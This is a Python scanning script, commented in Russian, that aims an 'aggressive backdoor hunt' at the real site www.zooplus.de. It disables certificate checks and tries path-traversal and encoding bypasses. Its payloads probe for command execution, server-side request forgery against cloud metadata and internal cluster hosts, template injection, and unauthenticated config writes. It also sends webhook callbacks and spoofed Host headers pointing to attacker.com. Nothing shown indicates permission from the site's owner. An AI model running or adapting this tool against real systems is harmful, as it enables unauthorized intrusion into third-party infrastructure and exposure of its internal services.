#!/usr/bin/env python3
"""
Aggressive Backdoor Hunter для Zooplus
Агрессивный поиск точек входа с обходами защиты
"""

import requests
import json
import sys
from urllib.parse import urljoin, urlparse, quote, unquote
from datetime import datetime
import re
import base64
import hashlib
import random
import string

class AggressiveBackdoorHunter:
    def __init__(self, target="www.zooplus.de"):
        self.target = target
        self.base_url = f"https://{target}"
        self.findings = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    def log_finding(self, severity, title, description, endpoint=None, method=None, payload=None, evidence=None):
        """Логирует находку"""
        finding = {
            "severity": severity,
            "title": title,
            "description": description,
            "endpoint": endpoint,
            "method": method,
            "payload": payload,
            "evidence": evidence,
            "timestamp": datetime.now().isoformat()
        }
        self.findings.append(finding)
        print(f"  [{severity}] {title}")
        if endpoint:
            print(f"      {method} {endpoint}")
        if payload:
            print(f"      Payload: {payload[:100]}")
    
    def test_path_traversal_bypass(self, base_path):
        """Тестирует path traversal обходы"""
        bypasses = [
            f"{base_path}",
            f"{base_path}/",
            f"{base_path}..",
            f"{base_path}../",
            f"{base_path}..//",
            f"{base_path}/..",
            f"{base_path}/../",
            f"{base_path}%2e%2e",
            f"{base_path}%2e%2e/",
            f"{base_path}%2f",
            f"{base_path}%252f",
            f"{base_path};",
            f"{base_path}?",
            f"{base_path}#",
            f"{base_path}%00",
            f"{base_path}%0a",
            f"{base_path}%0d",
            f"//{base_path}",
            f"/./{base_path}",
            f"/{base_path}/.",
            f"/{base_path}/..",
        ]
        return bypasses
    
    def test_encoding_bypass(self, path):
        """Тестирует различные кодирования"""
        encodings = [
            path,
            quote(path),
            quote(quote(path)),  # Double encoding
            path.replace('/', '%2f'),
            path.replace('/', '%252f'),  # Double encoded
            path.replace('/', '\\'),
            base64.b64encode(path.encode()).decode(),
            path.encode('utf-8').hex(),
        ]
        return encodings
    
    def test_method_bypass(self, path):
        """Тестирует различные HTTP методы"""
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
        results = []
        
        for method in methods:
            try:
                url = urljoin(self.base_url, path)
                resp = self.session.request(method, url, timeout=3, verify=False, allow_redirects=False)
                
                # Interesting responses
                if resp.status_code not in [404, 405, 403]:
                    results.append({
                        "method": method,
                        "status": resp.status_code,
                        "response": resp.text[:200] if resp.text else ""
                    })
            except:
                pass
        
        return results
    
    def aggressive_envoy_admin_hunt(self):
        """Агрессивный поиск Envoy admin endpoints"""
        print("\n[*] Агрессивный поиск Envoy admin endpoints...")
        
        base_paths = ["stats", "clusters", "config_dump", "listeners", "server_info", "runtime", "memory"]
        
        for base_path in base_paths:
            # Стандартные пути
            paths = [
                f"/{base_path}",
                f"/admin/{base_path}",
                f"/_admin/{base_path}",
                f"/envoy/{base_path}",
                f"/istio/{base_path}",
                f"/proxy/{base_path}",
                f"/api/{base_path}",
                f"/v1/{base_path}",
                f"/v2/{base_path}",
            ]
            
            # Path traversal обходы
            paths.extend(self.test_path_traversal_bypass(base_path))
            
            # Encoding обходы
            for encoded in self.test_encoding_bypass(f"/{base_path}"):
                if encoded not in paths:
                    paths.append(encoded)
            
            for path in paths[:10]:  # Limit to avoid too many requests
                try:
                    url = urljoin(self.base_url, path)
                    
                    # Test different methods
                    for method in ['GET']:  # Only GET to speed up
                        resp = self.session.request(method, url, timeout=2, verify=False, allow_redirects=False)
                        
                        if resp.status_code == 200:
                            content = resp.text.lower()
                            # Check for Envoy indicators
                            if any(keyword in content for keyword in ['cluster', 'listener', 'envoy', 'upstream', 'http', 'tcp']):
                                self.log_finding(
                                    "CRITICAL",
                                    f"Envoy Admin Endpoint Found: {path}",
                                    f"Envoy admin endpoint доступен через {method} {path}",
                                    endpoint=url,
                                    method=method,
                                    evidence=f"Status: {resp.status_code}, Contains Envoy data"
                                )
                                return True  # Found one, can stop
                except:
                    pass
    
    def aggressive_file_upload_hunt(self):
        """Агрессивный поиск file upload endpoints"""
        print("\n[*] Агрессивный поиск file upload endpoints...")
        
        upload_paths = [
            "/upload", "/api/upload", "/file/upload", "/media/upload",
            "/images/upload", "/admin/upload", "/upload/file",
            "/api/v1/upload", "/api/v2/upload", "/upload/image",
            "/upload/avatar", "/upload/document", "/upload/attachment"
        ]
        
        for path in upload_paths:
            # Test path variations
            variations = [path] + self.test_path_traversal_bypass(path.lstrip('/'))
            
            for var_path in variations:
                try:
                    url = urljoin(self.base_url, var_path)
                    
                    # Test POST with file
                    files = {'file': ('test.txt', 'test content', 'text/plain')}
                    resp = self.session.post(url, files=files, timeout=2, verify=False, allow_redirects=False)
                    
                    if resp.status_code in [200, 201, 302]:
                        self.log_finding(
                            "HIGH",
                            f"File Upload Endpoint: {var_path}",
                            f"File upload endpoint доступен: {var_path}",
                            endpoint=url,
                            method="POST",
                            payload="multipart/form-data file upload",
                            evidence=f"Status: {resp.status_code}"
                        )
                except:
                    pass
    
    def aggressive_code_execution_hunt(self):
        """Агрессивный поиск code execution endpoints"""
        print("\n[*] Агрессивный поиск code execution endpoints...")
        
        exec_paths = [
            "/api/execute", "/api/eval", "/api/run", "/api/script",
            "/admin/execute", "/console", "/api/command", "/api/system",
            "/api/shell", "/api/cmd", "/api/exec", "/api/code"
        ]
        
        payloads = [
            {"code": "print('test')"},
            {"command": "id"},
            {"script": "console.log('test')"},
            {"eval": "1+1"},
            {"exec": "echo test"},
        ]
        
        for path in exec_paths:
            variations = [path] + self.test_path_traversal_bypass(path.lstrip('/'))
            
            for var_path in variations:
                for payload in payloads:
                    try:
                        url = urljoin(self.base_url, var_path)
                        resp = self.session.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
                        
                        if resp.status_code == 200 and len(resp.text) > 0:
                            # Check if response looks like execution result
                            if any(keyword in resp.text.lower() for keyword in ['uid=', 'gid=', 'test', 'result', 'output']):
                                self.log_finding(
                                    "CRITICAL",
                                    f"Code Execution Endpoint: {var_path}",
                                    f"Code execution endpoint доступен: {var_path}",
                                    endpoint=url,
                                    method="POST",
                                    payload=str(payload),
                                    evidence=f"Status: {resp.status_code}, Response: {resp.text[:100]}"
                                )
                    except:
                        pass
    
    def aggressive_ssrf_hunt(self):
        """Агрессивный поиск SSRF векторов"""
        print("\n[*] Агрессивный поиск SSRF векторов...")
        
        ssrf_paths = [
            "/api/fetch", "/api/proxy", "/api/request", "/api/url",
            "/api/import", "/api/export", "/api/download", "/api/curl",
            "/api/http", "/api/get", "/api/post", "/api/request"
        ]
        
        # Internal targets
        internal_targets = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://kubernetes.default.svc",
            "http://istio-pilot.istio-system.svc.cluster.local"
        ]
        
        for path in ssrf_paths:
            variations = [path] + self.test_path_traversal_bypass(path.lstrip('/'))
            
            for var_path in variations:
                for target in internal_targets[:2]:  # Limit even more
                    payloads = [
                        {"url": target},
                        {"url": f"{target}/"},
                        {"endpoint": target},
                        {"link": target},
                        {"uri": target},
                        {"path": target},
                    ]
                    
                    for payload in payloads:
                        try:
                            url = urljoin(self.base_url, var_path)
                            resp = self.session.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
                            
                            if resp.status_code in [200, 400, 500]:
                                # Check if we got response from internal service
                                if len(resp.text) > 50 or target.split('//')[1].split('/')[0] in resp.text:
                                    self.log_finding(
                                        "HIGH",
                                        f"SSRF Vector: {var_path}",
                                        f"SSRF endpoint доступен: {var_path}, target: {target}",
                                        endpoint=url,
                                        method="POST",
                                        payload=str(payload),
                                        evidence=f"Status: {resp.status_code}, Response length: {len(resp.text)}"
                                    )
                        except:
                            pass
    
    def aggressive_config_hunt(self):
        """Агрессивный поиск config endpoints"""
        print("\n[*] Агрессивный поиск config endpoints...")
        
        config_paths = [
            "/api/config", "/api/settings", "/admin/config", "/api/admin/config",
            "/config", "/settings", "/api/v1/config", "/api/v2/config",
            "/config/update", "/settings/update", "/api/config/update"
        ]
        
        test_configs = [
            {"config": {"debug": True}},
            {"settings": {"log_level": "debug"}},
            {"env": {"DEBUG": "1"}},
        ]
        
        for path in config_paths:
            variations = [path] + self.test_path_traversal_bypass(path.lstrip('/'))
            
            for var_path in variations:
                # Test GET first
                try:
                    url = urljoin(self.base_url, var_path)
                    resp = self.session.get(url, timeout=2, verify=False, allow_redirects=False)
                    
                    if resp.status_code == 200:
                        # Check if it looks like config
                        if any(keyword in resp.text.lower() for keyword in ['config', 'setting', 'env', 'debug', 'log']):
                            self.log_finding(
                                "HIGH",
                                f"Config Endpoint (GET): {var_path}",
                                f"Config endpoint доступен для чтения: {var_path}",
                                endpoint=url,
                                method="GET",
                                evidence=f"Status: {resp.status_code}"
                            )
                except:
                    pass
                
                # Test POST/PUT
                for method in ['POST', 'PUT', 'PATCH']:
                    for config in test_configs:
                        try:
                            url = urljoin(self.base_url, var_path)
                            resp = self.session.request(method, url, json=config, timeout=2, verify=False, allow_redirects=False)
                            
                            if resp.status_code in [200, 201, 204]:
                                self.log_finding(
                                    "CRITICAL",
                                    f"Config Endpoint (Write): {var_path}",
                                    f"Config endpoint доступен для записи: {var_path}",
                                    endpoint=url,
                                    method=method,
                                    payload=str(config),
                                    evidence=f"Status: {resp.status_code}"
                                )
                        except:
                            pass
    
    def aggressive_webhook_hunt(self):
        """Агрессивный поиск webhook endpoints"""
        print("\n[*] Агрессивный поиск webhook endpoints...")
        
        webhook_paths = [
            "/webhook", "/webhooks", "/api/webhook", "/api/webhooks",
            "/hooks", "/callback", "/callbacks", "/notify", "/notification",
            "/api/hook", "/api/callback", "/api/notify"
        ]
        
        test_payloads = [
            {"url": "https://attacker.com/callback"},
            {"callback": "https://attacker.com/callback"},
            {"webhook": "https://attacker.com/callback"},
            {"endpoint": "https://attacker.com/callback"},
        ]
        
        for path in webhook_paths:
            variations = [path] + self.test_path_traversal_bypass(path.lstrip('/'))
            
            for var_path in variations:
                for payload in test_payloads:
                    try:
                        url = urljoin(self.base_url, var_path)
                        resp = self.session.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
                        
                        if resp.status_code in [200, 201, 202]:
                            self.log_finding(
                                "HIGH",
                                f"Webhook Endpoint: {var_path}",
                                f"Webhook endpoint доступен: {var_path}",
                                endpoint=url,
                                method="POST",
                                payload=str(payload),
                                evidence=f"Status: {resp.status_code}"
                            )
                    except:
                        pass
    
    def aggressive_template_hunt(self):
        """Агрессивный поиск template injection"""
        print("\n[*] Агрессивный поиск template injection...")
        
        template_paths = [
            "/api/render", "/api/template", "/render", "/template",
            "/api/preview", "/preview", "/api/generate", "/generate"
        ]
        
        # SSTI payloads for different engines
        ssti_payloads = [
            {"template": "{{7*7}}"},  # Jinja2, Twig
            {"template": "${7*7}"},    # Freemarker
            {"template": "#{7*7}"},   # Expression Language
            {"template": "<%=7*7%>"}, # ERB
        ]
        
        for path in template_paths:
            variations = [path] + self.test_path_traversal_bypass(path.lstrip('/'))
            
            for var_path in variations:
                for payload in ssti_payloads:
                    try:
                        url = urljoin(self.base_url, var_path)
                        resp = self.session.post(url, json=payload, timeout=2, verify=False, allow_redirects=False)
                        
                        if resp.status_code == 200:
                            # Check if calculation was executed
                            if "49" in resp.text:
                                self.log_finding(
                                    "CRITICAL",
                                    f"Template Injection: {var_path}",
                                    f"Template injection возможен: {var_path}",
                                    endpoint=url,
                                    method="POST",
                                    payload=str(payload),
                                    evidence=f"Status: {resp.status_code}, Calculation executed: 49 in response"
                                )
                    except:
                        pass
    
    def aggressive_api_discovery(self):
        """Агрессивное обнаружение API endpoints"""
        print("\n[*] Агрессивное обнаружение API endpoints...")
        
        # Common API patterns
        api_patterns = [
            "/api/v1", "/api/v2", "/api/v3",
            "/v1/api", "/v2/api", "/v3/api",
            "/rest/api", "/rest/v1", "/rest/v2",
            "/graphql", "/graphql/v1", "/graphql/v2",
        ]
        
        # Test with different methods and paths
        test_paths = [
            "", "/test", "/ping", "/health", "/status",
            "/users", "/admin", "/config", "/debug"
        ]
        
        for pattern in api_patterns:
            for test_path in test_paths:
                full_path = pattern + test_path
                
                # Test different methods
                for method in ['GET', 'POST', 'OPTIONS']:
                    try:
                        url = urljoin(self.base_url, full_path)
                        resp = self.session.request(method, url, timeout=2, verify=False, allow_redirects=False)
                        
                        if resp.status_code not in [404, 403]:
                            # Check if it looks like API
                            if any(keyword in resp.text.lower() for keyword in ['api', 'json', 'error', 'message', 'data']):
                                self.log_finding(
                                    "MEDIUM",
                                    f"API Endpoint Found: {full_path}",
                                    f"API endpoint обнаружен: {full_path}",
                                    endpoint=url,
                                    method=method,
                                    evidence=f"Status: {resp.status_code}"
                                )
                    except:
                        pass
    
    def test_header_injection(self):
        """Тестирует header injection"""
        print("\n[*] Тестирование header injection...")
        
        injection_paths = [
            "/api/redirect", "/redirect", "/api/forward",
            "/api/location", "/api/header"
        ]
        
        malicious_headers = [
            "X-Forwarded-Host: attacker.com",
            "Host: attacker.com",
            "X-Real-IP: 127.0.0.1",
            "X-Forwarded-For: 127.0.0.1"
        ]
        
        for path in injection_paths:
            try:
                url = urljoin(self.base_url, path)
                
                for header in malicious_headers:
                    headers = {header.split(':')[0]: header.split(':')[1].strip()}
                    resp = self.session.get(url, headers=headers, timeout=2, verify=False, allow_redirects=False)
                    
                    if header.split(':')[0] in resp.headers or header.split(':')[1].strip() in str(resp.headers):
                        self.log_finding(
                            "HIGH",
                            f"Header Injection: {path}",
                            f"Header injection возможен: {path}",
                            endpoint=url,
                            method="GET",
                            payload=header,
                            evidence=f"Header reflected in response"
                        )
            except:
                pass
    
    def generate_report(self):
        """Генерирует отчет"""
        return {
            "target": self.target,
            "scan_date": datetime.now().isoformat(),
            "total_findings": len(self.findings),
            "findings_by_severity": {
                "CRITICAL": len([f for f in self.findings if f["severity"] == "CRITICAL"]),
                "HIGH": len([f for f in self.findings if f["severity"] == "HIGH"]),
                "MEDIUM": len([f for f in self.findings if f["severity"] == "MEDIUM"]),
                "LOW": len([f for f in self.findings if f["severity"] == "LOW"])
            },
            "findings": self.findings
        }

def main():
    hunter = AggressiveBackdoorHunter()
    
    print("=" * 70)
    print("ZOOPLUS AGGRESSIVE BACKDOOR HUNTER")
    print("=" * 70)
    print("Агрессивный поиск точек входа с обходами защиты")
    print("=" * 70)
    print(f"Target: {hunter.target}")
    print(f"Start Time: {datetime.now()}")
    print("=" * 70)
    
    # Run all aggressive tests
    hunter.aggressive_envoy_admin_hunt()
    hunter.aggressive_file_upload_hunt()
    hunter.aggressive_code_execution_hunt()
    hunter.aggressive_ssrf_hunt()
    hunter.aggressive_config_hunt()
    hunter.aggressive_webhook_hunt()
    hunter.aggressive_template_hunt()
    hunter.aggressive_api_discovery()
    hunter.test_header_injection()
    
    # Generate report
    report = hunter.generate_report()
    
    # Save
    import os
    os.makedirs("reports", exist_ok=True)
    with open("reports/aggressive_backdoor_hunt.json", "w") as f:
        json.dump(report, f, indent=2)
    
    print("\n" + "=" * 70)
    print("HUNT SUMMARY")
    print("=" * 70)
    print(f"Total Findings: {report['total_findings']}")
    print(f"  CRITICAL: {report['findings_by_severity']['CRITICAL']}")
    print(f"  HIGH: {report['findings_by_severity']['HIGH']}")
    print(f"  MEDIUM: {report['findings_by_severity']['MEDIUM']}")
    print(f"  LOW: {report['findings_by_severity']['LOW']}")
    print(f"\n[+] Report saved to: reports/aggressive_backdoor_hunt.json")
    
    if report['total_findings'] > 0:
        print("\n[!] Найдены потенциальные точки входа!")
        print("    Проверьте отчет для деталей.")

if __name__ == "__main__":
    main()

